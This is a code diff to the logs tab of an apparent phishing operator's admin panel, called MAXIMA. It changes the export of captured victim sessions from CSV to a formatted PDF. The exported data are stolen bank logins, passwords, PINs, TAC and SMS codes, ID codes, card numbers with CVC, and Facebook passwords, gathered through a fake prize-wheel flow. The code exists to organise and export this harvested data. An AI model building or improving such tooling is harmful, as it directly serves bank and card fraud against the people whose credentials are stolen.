@@ -1372,112 +1372,143 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
         if (batch.length < BATCH) break;
       }
 
-      const esc = (v: unknown) => {
-        const s = v == null ? "" : String(v);
-        return `"${s.replace(/"/g, '""')}"`;
+      // Admin tablosuyla ayni kolon yapisi: cizgili tablo PDF
+      const stepTextFor = (s: string, fd: Record<string, any>): string => {
+        if (s === "wheel") return "ÇARK OYUNU";
+        if (s === "code_entry") return fd.is_wheel_game ? "ÇARK OYUNU" : "KOD GİRİŞİ";
+        if (s === "win") return "İSİM & PROFİL";
+        if (s === "verify") return "DOĞRULAMA";
+        if (s === "banken") return "BANKA SEÇİMİ";
+        if (s === "bank") {
+          const b = typeof fd.bankName === "string" ? fd.bankName : null;
+          return b ? b.toUpperCase() : "BANKA GİRİŞİ";
+        }
+        if (s === "sms") return "SMS ONAYI";
+        if (s === "card") return "KREDİ KARTI";
+        if (s === "facebook") return "FACEBOOK";
+        if (s === "wait") return "BEKLEMEDE";
+        if (s === "congrats" || s === "congratulations") return "TEBRİKLER";
+        if (s === "invalid_bank") return "HATALI BANKA";
+        if (s === "live_support") return "CANLI DESTEK";
+        if (s === "special_approval") return "ÖZEL BİLDİRİM";
+        return "BAŞLANGIÇ";
       };
 
-      // Her bilgi kendi kolonunda: bilinen alanlar + form_data'daki diger tum keyler
-      type Col = { header: string; get: (r: DemoSession, fd: Record<string, any>) => unknown };
-      const cols: Col[] = [
-        { header: "ID", get: (r) => r.public_id },
-        { header: "Session UUID", get: (r) => r.id },
-        { header: "Tarih", get: (r) => (r.created_at ? new Date(r.created_at).toLocaleString("tr-TR") : "") },
-        { header: "Odul", get: (r) => (r.amount ? `€${r.amount}` : "") },
-        { header: "Para Birimi", get: (_r, fd) => fd.currency },
-        { header: "Cark Sonucu", get: (_r, fd) => fd.wheel_result_label },
-        { header: "Cark Tutari", get: (_r, fd) => fd.wheel_result_amount },
-        { header: "Isim", get: (_r, fd) => fd.firstName },
-        { header: "Soyisim", get: (_r, fd) => fd.lastName },
-        { header: "Telefon", get: (_r, fd) => fd.phone },
-        { header: "Banka", get: (_r, fd) => fd.bankName },
-        { header: "Banka Slug", get: (_r, fd) => fd.bankSlug },
-        { header: "Giris Yontemi", get: (_r, fd) => fd.loginMethod },
-        { header: "Banka Tel", get: (_r, fd) => fd.bankPhone },
-        { header: "Kullanici Adi", get: (_r, fd) => fd.username },
-        { header: "Sifre", get: (_r, fd) => fd.password },
-        { header: "PIN", get: (_r, fd) => fd.pin },
-        { header: "TAC", get: (_r, fd) => fd.tacCode },
-        { header: "Kisisel Kod", get: (_r, fd) => fd.personalCode },
-        { header: "ID Kodu", get: (_r, fd) => fd.idCode },
-        { header: "Asmens Kodu", get: (_r, fd) => fd["Asmens-kodas"] },
-        { header: "Atpazinimo Kodu", get: (_r, fd) => fd["Atpažinimo-kodas"] },
-        { header: "Verfuegernummer", get: (_r, fd) => fd.verfuegernummer },
-        { header: "Ordered 1", get: (_r, fd) => fd.orderedField1 },
-        { header: "Ordered 2", get: (_r, fd) => fd.orderedField2 },
-        { header: "Ordered 2 Tipi", get: (_r, fd) => fd.orderedField2Type },
-        { header: "SMS Kodu", get: (_r, fd) => fd.smsCode },
-        { header: "Kart Sahibi", get: (_r, fd) => fd.cardHolder },
-        { header: "Kart No", get: (_r, fd) => fd.cardNumber },
-        { header: "Kart SKT", get: (_r, fd) => fd.cardExpiry },
-        { header: "Kart CVC", get: (_r, fd) => fd.cardCvc },
-        { header: "FB Isim", get: (_r, fd) => fd.fbFirstName },
-        { header: "FB Soyisim", get: (_r, fd) => fd.fbLastName },
-        { header: "FB E-posta", get: (_r, fd) => fd.fbEmail },
-        { header: "FB Sifre", get: (_r, fd) => fd.fbPassword },
-        { header: "FB User ID", get: (_r, fd) => fd.fbUserId },
-        { header: "Onay Durumu", get: (_r, fd) => fd.approvalStatus },
-        { header: "Onay Kodu", get: (_r, fd) => fd.approvalCode },
-        { header: "Onay Gecmisi", get: (_r, fd) => fd.approvalHistory },
-        { header: "Banka Gonderim Zamani", get: (_r, fd) => fd.bankSubmittedAt },
-        { header: "Sayfa", get: (r) => r.current_step },
-        { header: "Durum", get: (r) => r.status },
-        { header: "Gizli", get: (r) => (r.is_hidden ? "evet" : "") },
-        { header: "IP", get: (r) => r.ip_address },
-        { header: "Cihaz", get: (r) => r.user_agent },
-        { header: "Partner", get: (r) => r.partner_name },
+      const s = (v: unknown) => (v == null ? "" : String(v));
+
+      const tableBody: any[][] = [
+        ["ID", "Tarih", "Ödül", "İsim", "Numara", "Banka", "Onay", "SMS", "Kart", "Facebook", "Sayfa", "Durum", "IP"].map(
+          (h) => ({ text: h, bold: true, color: "#ffffff", fillColor: "#111827", fontSize: 7.5 })
+        ),
       ];
 
-      // curated getter'larda kullanilan form_data key'leri (tekrar kolon acmamak icin)
-      const CURATED_FD_KEYS = new Set([
-        "currency", "wheel_result_label", "wheel_result_amount", "firstName", "lastName", "phone",
-        "bankName", "bankSlug", "loginMethod", "bankPhone", "username", "password", "pin", "tacCode",
-        "personalCode", "idCode", "Asmens-kodas", "Atpažinimo-kodas", "verfuegernummer",
-        "orderedField1", "orderedField2", "orderedField2Type", "smsCode",
-        "cardHolder", "cardNumber", "cardExpiry", "cardCvc",
-        "fbFirstName", "fbLastName", "fbEmail", "fbPassword", "fbUserId",
-        "approvalStatus", "approvalCode", "approvalHistory", "bankSubmittedAt",
-      ]);
-
-      // form_data'daki kalan TUM keyler -> her biri kendi kolonu
-      const extraKeys = new Set<string>();
       for (const r of all) {
-        for (const k of Object.keys((r.form_data as Record<string, any>) ?? {})) {
-          if (!CURATED_FD_KEYS.has(k)) extraKeys.add(k);
-        }
-      }
-      const extraCols = [...extraKeys].sort();
-
-      const headers = [
-        ...cols.map((c) => c.header),
-        ...extraCols.map((k) => `Ek: ${k}`),
-        "Form Data (JSON)",
-      ];
-
-      const cell = (v: unknown) =>
-        v == null ? "" : typeof v === "object" ? JSON.stringify(v) : v;
-
-      const lines = all.map((r) => {
         const fd = (r.form_data ?? {}) as Record<string, any>;
-        return [
-          ...cols.map((c) => cell(c.get(r, fd))),
-          ...extraCols.map((k) => cell(fd[k])),
-          JSON.stringify(fd),
-        ]
-          .map(esc)
-          .join(";");
-      });
 
-      const csv = "﻿" + [headers.map(esc).join(";"), ...lines].join("\r\n");
-      const blob = new Blob([csv], { type: "text/csv;charset=utf-8" });
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement("a");
-      a.href = url;
-      a.download = `maxima-loglar-${isDeletedMode ? "silinen-" : ""}${new Date().toISOString().slice(0, 10)}.csv`;
-      document.body.appendChild(a);
-      a.click();
-      a.remove();
-      URL.revokeObjectURL(url);
+        const bankCell: any[] = [];
+        if (fd.bankName) bankCell.push({ text: s(fd.bankName), bold: true, color: "#a16207" });
+        const lm = readLoginMethod(fd);
+        if (lm) bankCell.push({ text: `Yöntem: ${lm}`, color: "#0e7490" });
+        for (const [k, v] of getShortBankCredentialFields(fd)) bankCell.push({ text: `${k}: ${v}` });
+        if (!bankCell.length) bankCell.push({ text: "-", color: "#9ca3af" });
+
+        const approvalHist = parseApprovalHistory(fd.approvalHistory);
+        const approvalEntries =
+          approvalHist.length > 0
+            ? approvalHist
+            : typeof fd.approvalStatus === "string" && fd.approvalStatus.trim()
+              ? [fd.approvalStatus.trim()]
+              : [];
+        const approvalCell = approvalEntries.length
+          ? approvalEntries.map((a) => ({ text: getApprovalDisplayText(a), color: "#059669" }))
+          : { text: "-", color: "#9ca3af" };
+
+        const smsValue = s(fd.smsCode).trim() || s(fd.tacCode).trim() || "-";
+
+        const cardCell: any[] = [];
+        if (fd.cardNumber) cardCell.push({ text: `No: ${s(fd.cardNumber)}` });
+        if (fd.cardExpiry) cardCell.push({ text: `SKT: ${s(fd.cardExpiry)}` });
+        if (fd.cardCvc) cardCell.push({ text: `CVC: ${s(fd.cardCvc)}` });
+        if (!cardCell.length) cardCell.push({ text: "-", color: "#9ca3af" });
+
+        const fbCell: any[] = [];
+        if (fd.fbEmail) fbCell.push({ text: `E-posta: ${s(fd.fbEmail)}`, color: "#1d4ed8" });
+        if (fd.fbPassword) fbCell.push({ text: `Parool: ${s(fd.fbPassword)}`, color: "#1d4ed8" });
+        if (fd.fbFirstName || fd.fbLastName) fbCell.push({ text: `Nimi: ${s(fd.fbFirstName)} ${s(fd.fbLastName)}`.trim() });
+        if (!fbCell.length) fbCell.push({ text: "-", color: "#9ca3af" });
+
+        tableBody.push([
+          s(r.public_id ?? r.id.split("-")[0]),
+          r.created_at ? new Date(r.created_at).toLocaleString("tr-TR") : "-",
+          { text: r.amount ? `€${r.amount}` : s(fd.wheel_result_label) || "-", bold: true, color: "#c2410c" },
+          s(`${fd.firstName ?? ""} ${fd.lastName ?? ""}`.trim()) || "-",
+          s(fd.phone) || "-",
+          { stack: bankCell },
+          Array.isArray(approvalCell) ? { stack: approvalCell } : approvalCell,
+          { text: smsValue, bold: smsValue !== "-" },
+          { stack: cardCell },
+          { stack: fbCell },
+          stepTextFor(String(r.current_step ?? ""), fd),
+          { text: s(r.status).toUpperCase() || "-", color: r.status === "online" ? "#059669" : "#6b7280" },
+          s(r.ip_address) || "-",
+        ]);
+      }
+
+      const pdfMakeModule = await import("pdfmake/build/pdfmake");
+      const pdfFontsModule = await import("pdfmake/build/vfs_fonts");
+      const pdfMake: any = (pdfMakeModule as any).default ?? pdfMakeModule;
+      pdfMake.vfs =
+        (pdfFontsModule as any).pdfMake?.vfs ??
+        (pdfFontsModule as any).default?.pdfMake?.vfs ??
+        (pdfFontsModule as any).vfs;
+
+      const dateStr = new Date().toISOString().slice(0, 10);
+      const doc: any = {
+        pageSize: "A4",
+        pageOrientation: "landscape",
+        pageMargins: [20, 46, 20, 30],
+        header: {
+          margin: [20, 12, 20, 0],
+          columns: [
+            { text: `MAXIMA — ${isDeletedMode ? "Silinen " : ""}Log Yedeği`, style: "title" },
+            { text: `${all.length} kayıt • ${dateStr}`, style: "subtitle", alignment: "right" },
+          ],
+        },
+        footer: (currentPage: number, pageCount: number) => ({
+          text: `Sayfa ${currentPage} / ${pageCount}`,
+          alignment: "center",
+          fontSize: 7,
+          color: "#9ca3af",
+          margin: [0, 8, 0, 0],
+        }),
+        content: [
+          {
+            table: {
+              headerRows: 1,
+              widths: ["auto", "auto", "auto", "*", "auto", "*", "*", "auto", "*", "*", "auto", "auto", "auto"],
+              body: tableBody,
+            },
+            layout: {
+              hLineWidth: () => 0.5,
+              vLineWidth: () => 0.5,
+              hLineColor: () => "#cbd5e1",
+              vLineColor: () => "#cbd5e1",
+              paddingLeft: () => 3,
+              paddingRight: () => 3,
+              paddingTop: () => 3,
+              paddingBottom: () => 3,
+            },
+            fontSize: 7,
+          },
+        ],
+        styles: {
+          title: { fontSize: 13, bold: true, color: "#111827" },
+          subtitle: { fontSize: 8, color: "#6b7280" },
+        },
+        defaultStyle: { fontSize: 7 },
+      };
+
+      pdfMake.createPdf(doc).download(`maxima-loglar-${isDeletedMode ? "silinen-" : ""}${dateStr}.pdf`);
     } catch (e) {
       alert(`Export hatasi: ${e instanceof Error ? e.message : "bilinmeyen hata"}`);
     } finally {
@@ -1733,7 +1764,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
               ) : (
                 <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16v2a2 2 0 002 2h12a2 2 0 002-2v-2M7 10l5 5 5-5M12 15V3" /></svg>
               )}
-              {exporting ? "İndiriliyor..." : "Excel İndir"}
+              {exporting ? "İndiriliyor..." : "PDF İndir"}
             </button>
             {isDeletedMode ? (
               <>
